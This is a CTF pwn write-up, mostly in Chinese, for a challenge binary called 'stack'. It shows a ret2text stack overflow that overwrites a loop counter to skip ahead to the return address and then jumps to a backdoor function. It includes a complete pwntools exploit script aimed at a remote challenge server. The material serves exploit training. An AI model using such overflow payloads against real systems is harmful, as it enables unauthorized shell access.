# stack

## 文件分析

NX on, PIE off, Canary off, RELRO off  
ghidra分析为64位程序

## 解题思路

最简单的ret2text，程序中存在后门函数，栈溢出空间自定，
只要注意xmm寄存器要求的栈平衡

还有一点是这道题中迭代器`i`在buf之上，在覆写时会覆盖到，
可以借机将其覆写为0x27，跳至栈上返回地址处

## EXPLOIT

```python
from pwn import *
def payload(lo):
    global sh
    if lo:
        sh = process('./stack')
    else:
        sh = remote('43.249.195.138', 21935)
    if lo & 0b10:
        gdb.attach(sh)
    sh.sendline(b'1600') # read size
    retAddr = 0x4012e5
    backdoor = 0x4012e6

    # payload, when reading '\x27' modifies the counter, skip to retAddr
    sh.sendline(b'0'*28 + b'\x27' + p64(retAddr) + p64(backdoor)) # add a ret to keep rsp balance
    sh.interactive()

payload(0)
```

Done.
